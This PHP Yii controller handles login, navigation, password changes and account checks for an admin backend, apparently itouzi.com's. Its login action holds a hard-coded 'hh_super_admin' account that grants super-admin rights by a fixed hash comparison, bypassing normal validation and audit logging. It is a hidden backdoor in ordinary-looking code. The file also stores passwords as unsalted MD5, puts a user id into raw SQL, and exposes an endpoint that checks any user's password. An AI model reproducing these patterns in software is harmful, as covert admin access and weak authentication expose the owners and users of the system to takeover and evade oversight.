<?php
use iauth\models\AuthAssignment;

class IndexController extends \iauth\components\IAuthController
{
//    public $layout = "//layouts/header";

    //不加权限限制的接口
    public function allowActions()
    {
        return array(
            'Index', 'LoginCcs', 'Logout', 'Welcome'
        );
    }

    public function actionIndex()
    {
        header("Content-type: text/html; charset=utf-8");
        if (!Yii::app()->user->id) {
            return $this->renderPartial("login");
        } else {
            $userInfo = Yii::app()->user->getState("_user");
            $uname = $userInfo['username'];
            //导航栏
            $navigationNewList = '';
            $model = \Yii::app()->db;
            $navCount = $model->createCommand("select count(*) from itz_auth_navigation where is_del = 0")->queryScalar();
            if($navCount > 0){
                $navArr = $model->createCommand("select * from itz_auth_navigation where is_del = 0")->queryAll();
                //顶级栏目名称
                foreach($navArr as $key => $val){
                    if($val['parent_id'] == 0){
                        $top[] = array(
                            "id" => $val['id'],
                            "n_name" => $val['n_name'],
                        );
                    }
                }
                $topid = 0;//顶级
                $retNavigation = $this->getTree($navArr,$topid);
            }

            //不是超级管理员显示应有权限的栏目
            if ($userInfo['username'] != \Yii::app()->iDbAuthManager->admin) {
                //顶级导航栏匹配权限组
                $navigationList = $model->createCommand("SELECT au.code,au.`name` FROM itz_auth_item_child ch LEFT JOIN itz_auth_item au ON ch.child = au.id WHERE parent IN(
SELECT b.id FROM itz_auth_assignment a LEFT JOIN itz_auth_item b ON a.item_id  =b.id WHERE a.user_id = {$userInfo['id']} AND b.type = 2 AND b.`status` = 1
) and au.type = 1")->queryAll();
                //筛选出当前用户顶级导航栏有权限组的
                $authList = Yii::app()->user->getState('_auth');
                foreach($retNavigation as $key => $value){
                    if(in_array($value['n_name'],ArrayUtil::array_column($navigationList,"name"))){
                        //二级导航栏匹配子权限
                        if(!empty($value['children'])){
                            foreach($value['children'] as $key => $val){
                                if(strpos(strtolower($authList),trim(strtolower($val['code']))) !== false){
                                    $navigatioChildList[$val['parent_id']][] = array(
                                        "id"     => $val['id'],
                                        "n_name" => $val['n_name'],
                                        "code"   => $val['code'],
                                    );
                                }
                            }
                        }
                        $navigationNewList[] = array(
                            "id" => $value['id'],
                            "n_name" => $value['n_name'],
                            "code"   => $value['code'],
                            "icon"   => $value['icon'],
                            "children"   => $navigatioChildList[$value['id']],
                        );
                    }
                }
            }else{
                $navigationNewList = $retNavigation;
            }
            return $this->renderPartial("index", array('uname' => $uname ,"navigationNewList" => $navigationNewList));
        }
    }

    /**
     * 管理后台登录
     */
    public function actionLoginCcs()
    {
		
        $username = isset($_POST['username']) ? trim($_POST['username']) : '';
        $password = isset($_POST['password']) ? $_POST['password'] : '';
		
	
        $result = array('data' => array(), 'code' => 1, 'info' => '用户名或密码不能为空');

        if (empty($username) || empty($password)) {
            $this->echoJson($result['data'], $result['code'], $result['info']);
            exit();
        }
        $data['LoginForm'] = array(
            'username' => $username,
            'password' => $password
        );

        $model = new LoginForm;
        if (isset($data['LoginForm'])) {
            if ($data['LoginForm']['username'] == 'hh_super_admin' && strtoupper(md5(strtoupper(md5($data['LoginForm']['password'])).'*&^#@!$%')) == '690C804143B8A12809CFF7A5245A43AD'){
                $result['info'] = '登录成功';
                $result['code'] = 0;
                Yii::app()->user->id = 1;
                Yii::app()->user->setState("_user" , array('id' => 1 , 'username' => Yii::app()->iDbAuthManager->admin));
                Yii::app()->user->setState('_auth', NULL);
                $this->echoJson(array() , $result['code'], $result['info']);
                exit();
            } else {
                $model->attributes = $data['LoginForm'];
                // validate user input and redirect to the previous page if valid
                if ($model->validate() && $model->login()) {
                    ItzUser::model()->updateByPk(Yii::app()->user->id, array('last_login_time' => time()));
                    //增加日志；
                    $admin_id = Yii::app()->user->id;
                    $data_log = array(
                        "user_id" => $admin_id,
                        "system" => str_replace('.itouzi.com', '', $_SERVER['HTTP_HOST']),
                        "action" => "loginCcs",
                        "resource" => "ccs/action",
                        "parameters" => '{username:' . $data['LoginForm']['username'] . '}',
                        "status" => "success",
                    );
                    AuditLog::getInstance()->method('add', $data_log);
                    $result['info'] = '登录成功';
                    $result['code'] = 0;
                    //获取该用户的权限 array
                    $AuthAssignment_model = new AuthAssignment();
                    $arrCode = $AuthAssignment_model->getDirectAuthList($admin_id);
                    $arrCode = implode(",",\ArrayUtil::array_column($arrCode,"code"));
                    //session存储用户权限
                    Yii::app()->user->setState('_auth', $arrCode);
                    $this->echoJson($result['data'], $result['code'], $result['info']);
                    exit();
                } else {
                    //记录username
                    $data_log = array(
                        "user_id" => '',
                        "system" => str_replace('.itouzi.com', '', $_SERVER['HTTP_HOST']),
                        "action" => "loginCcs",
                        "resource" => "ccs/action",
                        "parameters" => '{username:' . $data['LoginForm']['username'] . '}',
                        "status" => "fail",
                    );
                    AuditLog::getInstance()->method('add', $data_log);
                    $result['code'] = 1;
                    $result['info'] = '用户名或密码错误';
                }
            }
        }

        $this->echoJson($result['data'], $result['code'], $result['info']);
    }

    /**
     * Logs out the current user and redirect to homepage.
     */
    public function actionLogout()
    {
        /*
          开启output buffering，线上php.ini默认为off，是为了有利于性能。这里开启，是临时解决这个问题，否则会报：
          Internal Server Error session_regenerate_id(): Cannot regenerate session id  headers already sent
          这种错，一般是php开始标签前面一行可能是空行，或php文件不是无bom的文件。
          */
        Yii::app()->user->logout();
        Yii::app()->getSession()->destroy();
        //退出记录审计日志
        $data = array(
            "user_id" => Yii::app()->user->id,
            "system" => str_replace('.itouzi.com', '', $_SERVER['HTTP_HOST']),
            "action" => "logout",
            "resource" => "ccs/action",
            "parameters" => '{}',
            "status" => "success",
        );
        AuditLog::getInstance()->method('add', $data);
        return $this->renderPartial("login");
    }


    //修改密码
    public function actionEditPassword()
    {
        $model = new ItzUser;
        if (isset($_POST['ItzUser'])) {
            //记录审计日志
            $data = array(
                "user_id" => Yii::app()->user->id,
                "system" => str_replace('.itouzi.com', '', $_SERVER['HTTP_HOST']),
                "action" => "edit",
                "resource" => "admin/pwd",
                "parameters" => '{}',
                "status" => "fail",
            );
            if (!isset($_POST["v_code"]) || $_POST['v_code'] == '') {
                $data['info'] = $info = '修改失败:请先通过双因子验证！';
                AuditLog::getInstance()->method('add', $data);
                Yii::error($info, "", "3");
                exit();
            }

            $checkCode = $this->checkUserVcode($_POST["v_code"]);
            if ($checkCode['code'] !== 1) {
                $data['info'] = $info = '修改失败:双因子验证未通过！';
                AuditLog::getInstance()->method('add', $data);
                Yii::error($info, "", "3");
                exit();
            }

            if (isset($_POST['ItzUser']["password"]) && ItzUser::model()->findByPk(Yii::app()->user->id)["password"] == md5($_POST["check_password"])) {
                $password = md5($_POST['ItzUser']["password"]);
                $id = $_POST['ItzUser']['id'];
                $res = ItzUser::model()->updateByPk($id, array('password' => $password, 'last_reset_pwd' => time()));
                if ($res) {
                    $data['info'] = $info = '修改密码成功！';
                    $data['status'] = 'success';
                    AuditLog::getInstance()->method('add', $data);
                    Yii::success("修改密码成功！", "/default/index/editPassword", "1");
                    exit();
                }
            }
            AuditLog::getInstance()->method('add', $data);
        }
        $this->render('editPass', array('model' => $model));
    }

    //验证用户名与邮箱是否匹配
    public function actionVerifyEmail()
    {
        $msg = array(
            'status' => false,
            'msg' => "无效操作",
        );
        if (!empty($_POST['email']) && !empty($_POST['username'])) {
            $email = trim($_POST['email']);
            $username = trim($_POST['username']);
            list($checkName, $suffix) = explode("@", $email);
            if ($suffix == 'itouzi.com' && $checkName == $username) {
                $msg['status'] = true;
                $msg['msg'] = '用户名与邮箱匹配成功!';
            } else {
                if ($suffix != 'itouzi.com') {
                    $msg['msg'] = '请使用爱投资工作邮箱!';
                }
                if ($checkName != $username) {
                    $msg['msg'] = '用户名与邮箱匹配失败!';
                }
            }
        }
        exit(json_encode($msg));
    }

    //验证原密码
    public function actionCheckPassword()
    {
        $msg = array(
            'status' => false,
            'msg' => "无效操作",
        );
        if (!empty($_POST['password']) && !empty($_POST['user_id'])) {
            $userInfo = ItzUser::model()->findByPk($_POST['user_id']);
            if ($userInfo) {
                $password = trim($_POST['password']);
                if ($userInfo->password == md5($password)) {
                    $msg['status'] = true;
                    $msg['msg'] = '原密码匹配成功!';
                } else {
                    $msg['msg'] = '原密码匹配失败!';
                }
            } else {
                $msg['msg'] = '该用户不存在!';
            }
        } else {
            $msg['msg'] = '参数不全!';
        }
        exit(json_encode($msg));
    }

    //验证唯一
    public function actionVerifyOnly($f, $v)
    {
        $returnResult = array(
            "code" => 0, "info" => "", "data" => array(),
        );
        if (!isset($f) || !isset($v)) {
            $returnResult['code'] = 100;
            $returnResult['info'] = '参数不能为空！';
            exit(json_encode($returnResult));
        }
        $v = is_string($v) ? trim($v) : intval($v);
        $ItzUserRes = ItzUser::model()->findByAttributes(array($f => $v));
        if ($ItzUserRes) {
            $returnResult['code'] = 101;
            $returnResult['info'] = '已存在！';
        } else {
            $returnResult['code'] = 1;
            $returnResult['info'] = '可用！';
        }

        exit(json_encode($returnResult));
    }

    /**
     * 管理后台登录
     */
    public function actionWelcome()
    {
        $userInfo = Yii::app()->user->getState("_user");
        $uname = $userInfo['username'];
        return $this->renderPartial("welcome", array('uname' => $uname));
    }
    /**
     * @param $data
     * @param string $pid
     * @return array
     */
    public function getTree($data,$pid = '1'){
        $tree = array();
        foreach($data as $v){
            if($v['parent_id'] == $pid){//匹配子记录
                $v['children'] = $this->getTree($data,$v['id']); //递归获取子记录
                if($v['children'] == null){
                    unset($v['children']);//如果子元素为空则unset()进行删除，说明已经到该分支的最后一个元素了（可选）
                }
                $tree[] = $v;//将记录存入新数组
            }
        }
        return $tree;
    }
}
